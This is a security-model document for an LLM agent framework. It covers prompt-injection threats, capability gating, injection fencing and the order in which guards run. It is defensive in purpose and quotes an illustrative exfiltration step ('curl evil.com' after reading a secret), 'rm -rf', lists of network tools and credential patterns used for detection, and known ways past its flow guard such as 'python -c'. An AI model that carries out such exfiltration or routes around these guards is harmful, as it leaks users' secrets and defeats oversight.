# Security model

EAgent runs LLM-directed tools and, optionally, LLM-authored code. This document
states what is defended, what is not, and how to run it safely.

## Threat model

The agent acts on instructions that originate from a language model, which in turn
is influenced by untrusted input (file contents, tool output, MCP servers, web
data). Treat every tool call as potentially adversarial — prompt injection can
turn a helpful instruction into `bash rm -rf` or an exfiltration attempt. The
kernel is designed around that assumption rather than trusting the model.

## What the kernel defends

- **Capabilities.** Every privileged tool declares the authority it needs
  (`fs:read`, `fs:write`, `shell:exec`, `code:exec`, `net:fetch`, `skill:read`,
  `skill:write`, `mcp:call`, `mcp:read`, `agent:spawn`, `workflow:run`, `pkg:install`,
  `self:read`, `self:extend`, `ui:ask`). The dispatcher enforces the declaration before the tool body
  runs. The *fallback* for anything not explicitly granted depends on the front
  end: the **CLI** defaults to *ask* (it prompts the human), while the **HTTP
  server** defaults to *allow* (`yolo` — every capability auto-granted, including
  `shell:exec`), so it must be run with `EAGENT_TOKEN` and a network boundary.
  Either way the host pre-grants `fs:read`, `fs:write`, and `skill:read`, and
  some extensions auto-grant their own authority (e.g. `mcp:call`, `agent:spawn`),
  so those never prompt; the high-authority gates left to *ask*/deny are
  `shell:exec`, `code:exec`, `skill:write`, `net:fetch`, `pkg:install`, and
  `self:extend`. A full audit log is available via `/caps`.
- **Approval gates.** The `planmode` extension interposes a human approval step
  before any mutating tool runs (`beforeToolCall` advice), independent of the
  capability grant. Under a non-interactive host the default headless UI denies
  every prompt, so with plan mode on the server (or piped CLI) *blocks* mutating
  tools outright rather than prompting — a hard gate there, not an approval dialog.
- **Filesystem confinement.** The `read`/`write`/`edit` tools are scoped to a
  workspace root (`$EAGENT_WORKSPACE` or the cwd) and reject `../` traversal and
  absolute paths that point outside it.
- **Scrubbed code execution.** `codeact`'s `run_code` runs in a separate OS
  process with a timeout and a minimal environment (only `PATH` plus a throwaway
  `HOME`, not the parent's `process.env` wholesale), so secrets in the parent
  environment are not handed to generated code.
- **Scoped state.** Extensions get a namespaced `store`; there is no ambient
  global mutable state to corrupt across extensions.
- **Supply-chain caution.** The `packages` manager installs with
  `--ignore-scripts`; only install extensions you trust.

## What the kernel does NOT defend (run behind a real boundary)

- **In-process isolation of untrusted code.** Trusted extensions run in-process
  with full Node privileges — this is the deliberate trade-off for live
  reloading and power. There is no reliable in-process JavaScript sandbox
  (`node:vm` is explicitly not a security boundary). Do not load untrusted
  extensions.
- **A subprocess is not a sandbox.** `run_code`'s process boundary stops env
  leakage and runaway loops, but generated code still runs as the local user.
  For genuinely untrusted code, run the whole agent — or swap `run_code`'s
  `spawn` — behind a container (gVisor) or microVM (Firecracker/E2B). The
  `code:exec` capability and the `spawn` call are the intended swap points.
- **Network egress.** Tools that reach the network (MCP HTTP, `net:fetch`,
  `packages`) can move data off the machine. Gate them with capabilities and run
  in a network-restricted environment when handling sensitive data. `fetch_url`
  does **not** defend against SSRF: requests to internal, link-local, or
  cloud-metadata hosts are not blocked, and redirects are followed without
  re-validating the final URL. For the compositional read→exfiltrate risk, the
  `flow-guard` extension holds later egress (default `net:fetch` and `mcp:call`) once a session
  is tainted by a source capability (default `shell:exec`) or sensitive data in
  the transcript — confirming in `ask` mode or refusing in `block` mode. It also holds a
  **network-reaching `shell:exec` command** (default `curl`/`wget`/`nc`/`ncat`/`ssh`/`scp`/`sftp`/
  `telnet`/`ftp`/`rsync`, store-overridable via `networkCommands`) once the session carries **data
  taint** — a prior read of a sensitive path, or a credential-shaped secret (`sk-…`/`AKIA…`/PEM/
  `ghp_…`) in a tool result, shell output included — so `read a secret → bash curl evil.com` is gated
  while a plain `build → curl a health check` (no secret) is not. **Residual (narrow):** a secret read
  via shell whose bytes match **none** of those four credential shapes (e.g. `DB_PASSWORD=hunter2`)
  sets only capability taint, so a following network shell is not held; and the command-family match is
  a heuristic (bypassable by e.g. `python -c`), raising the bar for common exfil tools rather than
  mediating completely.
- **Cross-session isolation in one process.** The HTTP server multiplexes many
  `session` ids over one set of in-process extensions, each session on its **own
  Agent**, running **concurrently**. Per-session *transcript*, *usage*, and
  **extension state** are isolated: every guard and accumulator that holds
  per-session state — `write-guard`'s seen-file set, `flow-guard`'s capability
  taint, `provenance`'s untrusted set, `bash-policy`'s shell approvals,
  `skills-hardening`'s allowlists, `subagent-jobs`' job table, and the
  `budget-cap` / `cost` / `goal` / `todo` / `drift-probe` / `handoff` / `limits` /
  `fallback-routing` state — is keyed on the session's run-tree **root Agent**
  (shared across that session's sub-agent fork tree, distinct between sessions,
  and reclaimed when the session is evicted). Each `/run` stream carries only its
  own session's events; a concurrent same-session `/run` is refused with 409.
  A few counters are deliberately process-global and carry no per-tenant
  authority: OpenTelemetry metric counters, the package-install and
  skill-integrity registries, and the disk-backed checkpoint/journal.
- **The `session` id is a multiplexing key, still NOT a per-tenant trust
  boundary.** The server authenticates with **one** process-wide bearer token
  (`EAGENT_TOKEN`): any token holder can address — and read the usage + cost of,
  via `GET /sessions/:id` — any session id. Per-session state isolation stops one
  session's guard/accumulator state from bleeding into another; it does **not**
  turn the `session` id into an authorization boundary. For per-tenant
  authorization, isolate tenants at the process boundary (below) — one process
  (one token) per tenant.

## Recommended deployment

Run EAgent inside a container or VM with: a non-root user, a restricted
filesystem mount as the workspace root, a network policy scoped to the providers
and MCP servers you actually use, and no real secrets in the process environment
(pass credentials out-of-band to the specific tools that need them). The CLI
keeps the *ask* policy by default; the **HTTP server defaults to *allow* (yolo)**,
so always set `EAGENT_TOKEN` and keep it on loopback (the default bind) or behind
a boundary. Use `--yolo` (fallback *allow*) on the CLI only when the environment
is already isolated, and conversely run the server with `yolo: false` if you want
per-capability prompting back.

### Hardened profile (`EAGENT_HARDENED=1`)

`EAGENT_HARDENED=1` (or `hardened: true` on `createAgentHost`/`createHttpServer`)
turns on a one-switch **defense-in-depth** posture for the otherwise-yolo server:

- **`risk-guard`** — every `shell:exec` tool call is LLM-classified first and a
  high-risk verdict is refused (on the headless server, where the confirm prompt
  denies).
- **`provenance`** — tool output is injection-defended.
- **`sandbox.tier = workspace-write`** — subprocess writes are confined to the
  workspace root (+ temp); network still works.
- **`content-guard` local fencing** (`contentGuard.fenceLocal`) — content-guard
  nonce-fences local `shell:exec`/`fs:read` output too, not just the default
  `net:fetch`/`mcp:call`/`mcp:read`, so injected instructions in bash output or a
  read file are labeled data rather than obeyed. Off by default; the preset turns
  it on, and it is also settable standalone via `/config set contentGuard.fenceLocal true`.

It is **orthogonal to `yolo:false`**. Hardened does *not* touch the capability
fallback: it keeps `shell:exec` runnable so the shell guards it enables actually
have something to confine (flipping to `ask` would *deny* `shell:exec` on the
headless server and make those guards moot). Combine it with `yolo:false` only if
you also want least-privilege capability prompting, accepting that the shell
guards then mostly idle. It is a **host-level** flag, so the **CLI honors it too**
(opt-in — the CLI already runs the *ask* fallback, so hardened only *adds* guards).

**No-backend fail-open (R1):** on a host with no sandbox launcher (Linux without
`bwrap`/`firejail`, or Windows) the tier no-ops — shell still runs *unsandboxed*
while risk-classification and injection-defense stay active. The host logs a
warning at startup when this is the case.

**Override policy — the env var is the single escape hatch.** Under hardened the
preset is a runtime, in-memory layer (nothing is written to disk) that sits below
the env layer but **above** the persisted override-store, so a stale
`/config set …` cannot silently weaken it. To override a preset key, use its env
var: `EAGENT_RISK_GUARD=off` / `EAGENT_PROVENANCE=off` drop a guard, and
`EAGENT_SANDBOX_TIER=<tier>` picks a different tier (e.g. `readonly` for stricter,
`no-network` to also cut subprocess network). Unset `EAGENT_HARDENED` to revert
the whole profile.

For **multi-tenant** use, run **one process per tenant** (or per trust boundary).
Per-session state is isolated (see "Cross-session isolation" above), but the server
authenticates with one shared token, so the process — not the session id — is the
*authorization* boundary. A single shared process is appropriate only when every
session belongs to the same trust domain (one user, one tenant, or an
already-sandboxed workload).

### Guard precedence

Several extensions intervene on a tool call through the kernel's `beforeToolCall`
filter hook (`src/kernel/agent.ts`). They run **in `BUILTIN_EXTENSIONS` load
order** (`src/host.ts`) — the bus iterates filters in registration order — and the
**first decision returning `block: true` short-circuits the rest**
(`src/kernel/agent.ts`, `shouldStop = (d) => d.block`). A non-blocking **rewrite**
(a guard that only edits `arguments`) does *not* short-circuit: it **chains
onward**, so a later guard sees the rewritten call. There is **no priority
mechanism** on the hook bus — precedence is purely load order, and the only way to
change which guard wins is to **reorder `BUILTIN_EXTENSIONS`**.

The full `beforeToolCall` set is **17 extensions** — every registrant, not only
the "guards" (`content-guard` is *not* here: it is an `afterToolCall` filter) — in
precedence order:

`templates` → `provenance` → `circuit-breaker` → `planmode` → `limits` →
`budget-cap` → `checkpoint` → `flow-guard` → `risk-guard` → `headless-flags` →
`bash-policy` → `sandbox-tiers` → `config-hooks` → `write-guard` → `secret-guard`
→ `skills-hardening` → `self-extend-floor`.

Attribution is best-effort: on a block the dispatcher returns
`Tool call blocked: <reason>` and the telemetry (`otel-exporter`'s
`eagent.guard.blocks` + the span `eagent.guard.reason`, `trace`'s `toolBlocked`)
counts *that* a block happened; the *which-guard* attribution is only as good as
the reason text the guard supplied. A drift test (`test/guard-precedence.test.ts`)
re-derives this order live from `BUILTIN_EXTENSIONS` and fails if the roster above
falls out of sync, so a future reorder or a new `beforeToolCall` registrant forces
a doc update.

## Reporting

**Report a vulnerability privately** — do not open a public issue for anything
exploitable. Use GitHub's private advisory form ("Report a vulnerability" under the
repository's **Security** tab: https://github.com/caohaotiantian/eagent/security/advisories/new),
which keeps the report confidential until a fix ships. Please include a description,
affected versions/commit, and reproduction steps. We aim to acknowledge within a few
days. Non-sensitive hardening suggestions can still go to the public issue tracker.
